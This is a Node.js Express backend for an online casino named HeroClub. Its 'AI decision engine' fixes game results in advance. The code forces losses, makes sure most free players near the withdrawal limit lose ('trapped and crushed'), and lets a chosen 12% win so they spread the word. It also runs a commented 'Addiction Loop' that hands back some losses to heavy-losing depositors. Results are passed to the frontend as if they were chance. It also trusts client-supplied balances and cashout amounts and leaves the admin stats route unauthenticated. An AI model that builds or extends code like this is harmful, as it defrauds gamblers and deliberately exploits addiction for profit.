const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// ========================================================================
// 🏦 THE GLOBAL CASINO VAULT (LIQUIDITY POOL)
// ₹1 = 100 Coins. 
// ========================================================================
let globalVault = {
    totalBetsIn: 0,          
    totalPayoutsOut: 0,      
    houseReserve: 0,         // Tera pakka Profit (15%)
    activeLiquidity: 20000,  // 20k Buffer to stabilize start
    totalGamesPlayed: 0
};

// ⚙️ CASINO SETTINGS
const HOUSE_EDGE_PERCENT = 0.15; 
const WITHDRAWAL_LIMIT = 3000; // 30 INR

let usersDB = {}; 

app.get('/', (req, res) => {
    res.send(`HeroClub Master Brain Active 🧠 | House Profit: ${globalVault.houseReserve} | User Liquidity Pool: ${globalVault.activeLiquidity}`);
});

app.get('/api/admin/stats', (req, res) => {
    res.json({
        status: "Brain is Active 🧠",
        vault: globalVault,
        activeUsers: Object.keys(usersDB).length
    });
});

// ========================================================================
// 🕹️ THE MASTER PLAY ENDPOINT (AI DECISION ENGINE)
// ========================================================================
app.post('/api/play', (req, res) => {
    try {
        const { uid, game, betAmount, isDepositor, currentBalance } = req.body; 
        
        let bet = Math.floor(parseFloat(betAmount)) || 0;
        let userBalance = Math.floor(parseFloat(currentBalance)) || 0;
        let gameName = game ? game.toLowerCase() : "unknown";
        
        if (bet < 10) return res.json({ success: false, error: "Minimum bet is 10 Coins" });
        if (bet > userBalance) return res.json({ success: false, error: "Insufficient Balance" });

        // 1. INITIALIZE / UPDATE USER PROFILE
        if (!usersDB[uid]) {
            usersDB[uid] = { 
                totalBet: 0, totalWon: 0, 
                currentLossStreak: 0, currentWinStreak: 0,
                isVIP: isDepositor || false
            };
        }

        let user = usersDB[uid];
        if (isDepositor) user.isVIP = true; 
        
        user.totalBet += bet;
        let userNetProfit = user.totalWon - user.totalBet; // Negative means they are in Loss

        // 2. VAULT ACCOUNTING
        globalVault.totalBetsIn += bet;
        globalVault.totalGamesPlayed += 1;
        
        // Take 15% guaranteed house edge, rest goes to the playable liquidity pool
        let houseCut = bet * HOUSE_EDGE_PERCENT;
        globalVault.houseReserve += houseCut;
        globalVault.activeLiquidity += (bet - houseCut);

        // ==========================================
        // 🧠 3. THE AI DECISION ENGINE
        // ==========================================
        let forceWin = false;
        let forceLoss = false;
        let allowHighFlight = false; 
        let bigWinMultiplier = 0; // AI calculated specific recovery multiplier
        let targetMultiplier = 0;
        let isFreeUser = !user.isVIP;

        let rnd = Math.random(); 

        // --- RULE 1: STRICT VAULT PROTECTION (AI Survival) ---
        // If we don't have enough money to pay out a 2x win, everyone loses.
        if (globalVault.activeLiquidity < (bet * 2)) {
            forceLoss = true; 
        }

        // --- RULE 2: FREE USER 12% LUCKY ALLOWANCE (Marketing Cost) ---
        if (!forceLoss && isFreeUser && userBalance >= 2500 && userBalance < WITHDRAWAL_LIMIT) {
            // Check if house has enough profit buffer to allow a free withdrawal (> 10,000 liquid)
            if (globalVault.activeLiquidity > 10000 && rnd < 0.12) {
                // CONGRATS! You are the 12%. Let them win big so they withdraw and spread the word.
                forceWin = true;
                allowHighFlight = true; 
            } else {
                // The remaining 88% get trapped and crushed
                if (Math.random() < 0.85) forceLoss = true;
            }
        }

        // --- RULE 3: VIP "OWN MONEY BACK" RECOVERY (Addiction Loop) ---
        // If a VIP has lost a lot (more than 10x their current bet), give them their money back!
        if (!forceLoss && !isFreeUser && userNetProfit < -(bet * 10)) {
            // 25% chance to trigger recovery IF vault can afford to give it back
            if (rnd < 0.25 && globalVault.activeLiquidity > Math.abs(userNetProfit)) {
                forceWin = true;
                allowHighFlight = true;
                
                // Calculate how much multiplier they need to get back roughly 70-100% of their loss
                let neededMult = Math.abs(userNetProfit) / bet;
                bigWinMultiplier = Math.min(neededMult, 15.0); // Cap at 15x max to avoid pool drain
            }
        }

        // --- RULE 4: GENERAL GAMEPLAY (Standard 60/40 Split) ---
        if (!forceWin && !forceLoss && bigWinMultiplier === 0) {
            if (bet <= 300) {
                if (rnd < 0.60) forceLoss = true; // 60% Lose
                else if (rnd < 0.85) forceWin = true; // 25% Win
                else allowHighFlight = true; // 15% Tease
            } 
            else if (bet <= 1000) {
                if (userNetProfit > 0) forceLoss = true; // Take back if in profit
                else {
                    if (rnd < 0.70) forceLoss = true;
                    else forceWin = true; 
                }
            } 
            else {
                // High rollers
                if (rnd < 0.80) forceLoss = true; 
                else forceWin = true;
            }
        }

        // --- RULE 5: ANTI-STREAK LOGIC ---
        if (user.currentWinStreak >= 3) forceLoss = true; // Never let them win 4 in a row
        if (user.currentLossStreak >= 4 && globalVault.activeLiquidity > (bet * 3) && !forceLoss) {
            forceWin = true; // Pity win after 4 losses
        }

        // ==========================================
        // 🚀 4. GENERATING THE CRASH MULTIPLIER
        // ==========================================
        if (gameName.includes("crash") || gameName.includes("chicken") || gameName.includes("road")) {
            
            if (forceLoss) {
                // Brutal Loss
                targetMultiplier = 1.01 + (Math.random() * 0.19); // 1.01x - 1.20x
            } 
            else if (bigWinMultiplier > 0) {
                // AI VIP Recovery: Give them a multiplier close to what they lost
                targetMultiplier = bigWinMultiplier * (0.8 + (Math.random() * 0.4)); // +/- 20% of target
                if(targetMultiplier < 2.0) targetMultiplier = 2.0; 
            } 
            else if (allowHighFlight) {
                // The Free User Tease & Allowances
                targetMultiplier = 4.5 + (Math.random() * 6.5); // 4.5x - 11.0x
            } 
            else if (forceWin) {
                // Normal Gameplay Win
                targetMultiplier = 1.5 + (Math.random() * 2.0); // 1.5x - 3.5x
            } 
            else {
                // Safe Fallback
                targetMultiplier = 1.15 + (Math.random() * 0.35); 
            }
            
        } 
        else {
            // Logic for Fixed Odds Games
            if (forceLoss) {
                targetMultiplier = 0;
                user.currentLossStreak += 1;
                user.currentWinStreak = 0;
            } else {
                targetMultiplier = 1.8 + (Math.random() * 0.2); 
                let winAmount = Math.floor(bet * targetMultiplier);
                globalVault.activeLiquidity -= winAmount; 
                globalVault.totalPayoutsOut += winAmount;
                user.totalWon += winAmount;
                user.currentWinStreak += 1; user.currentLossStreak = 0;
            }
        }

        // Send accurate Math format back to frontend
        res.json({
            success: true,
            multiplier: parseFloat(targetMultiplier.toFixed(2))
        });

    } catch (error) {
        console.error("Play API Error:", error);
        res.json({ success: false, error: "Brain Fault", multiplier: 1.05 }); 
    }
});


// ========================================================================
// 💸 THE CASHOUT ENDPOINT (Updates Vault & Streaks for Crash)
// ========================================================================
app.post('/api/cashout', (req, res) => {
    try {
        const { uid, cashoutAmount } = req.body;
        let payout = Math.floor(parseFloat(cashoutAmount)) || 0;

        if (!usersDB[uid]) return res.json({ success: false, error: "User not found in session" });

        let user = usersDB[uid];

        if (payout > 0) {
            // User Won
            if (globalVault.activeLiquidity >= payout) {
                globalVault.activeLiquidity -= payout; 
            } else {
                globalVault.houseReserve -= payout; 
            }
            
            globalVault.totalPayoutsOut += payout;
            user.totalWon += payout;
            user.currentWinStreak += 1;
            user.currentLossStreak = 0;
            
            res.json({ success: true, payout: payout });
        } else {
            // User Lost (Payout is 0)
            user.currentLossStreak += 1;
            user.currentWinStreak = 0;
            res.json({ success: true, payout: 0 });
        }
        
    } catch (error) {
        console.error("Cashout API Error:", error);
        res.json({ success: false });
    }
});

// Explicit Lose Endpoint from Frontend
app.post('/api/lose', (req, res) => {
    try {
        const { uid } = req.body;
        if (usersDB[uid]) {
            usersDB[uid].currentLossStreak += 1;
            usersDB[uid].currentWinStreak = 0;
        }
        res.json({ success: true });
    } catch (e) { res.json({ success: false }); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
